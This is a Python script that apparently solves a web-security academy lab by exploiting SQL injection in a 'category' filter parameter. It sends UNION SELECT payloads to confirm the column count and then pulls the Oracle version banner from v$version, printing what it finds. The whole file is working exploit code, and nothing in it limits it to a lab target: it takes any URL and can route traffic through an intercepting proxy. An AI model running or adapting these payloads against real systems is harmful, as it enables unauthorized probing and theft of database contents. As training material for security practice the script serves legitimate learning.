# === Standard Library ===
import sys

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install with: pip install requests")

# === Configuration ===
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

def run_union_sqli(base_url):
    headers = {"User-Agent": "Mozilla/5.0"}

    # 1. Verify columns - Optional but recommended
    test_payload = "'+UNION+SELECT+'abc','def'+FROM+dual--"
    test_url = f"{base_url}/filter?category={test_payload}"

    print("[*] Sending test UNION query to verify columns...")
    try:
        res_test = requests.get(test_url, headers=headers, proxies=PROXY if USE_PROXY else None, timeout=5)
        if res_test.status_code == 200 and "abc" in res_test.text and "def" in res_test.text:
            print("[+] Column verification successful.")
        else:
            print("[!] Column verification may have failed. Proceeding anyway.")
    except Exception as e:
        print(f"[!] Error during test query: {e}")

    # 2. Extract Oracle DB version
    version_payload = "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--"
    version_url = f"{base_url}/filter?category={version_payload}"

    print(f"[*] Sending version extraction payload:\n{version_payload}")
    try:
        res_version = requests.get(version_url, headers=headers, proxies=PROXY if USE_PROXY else None, timeout=5)
        if res_version.status_code == 200:
            # Print snippet around the injected data
            snippet_start = res_version.text.find("Oracle")
            snippet_end = snippet_start + 150
            if snippet_start != -1:
                print("[+] Oracle version string snippet found:")
                print(res_version.text[snippet_start:snippet_end])
            else:
                print("[-] Oracle version string not found in response.")
        else:
            print(f"[-] Request failed with status code: {res_version.status_code}")
    except Exception as e:
        print(f"[!] Exception during version extraction: {e}")

# === Main ===
if __name__ == "__main__":
    print("\n=== Oracle SQLi Version Extraction Lab ===")
    url = input("Enter the full lab URL (e.g., https://lab-id.web-security-academy.net): ").strip().rstrip('/')
    if not url.startswith("http"):
        print("[-] Invalid URL format.")
        sys.exit(1)

    run_union_sqli(url)
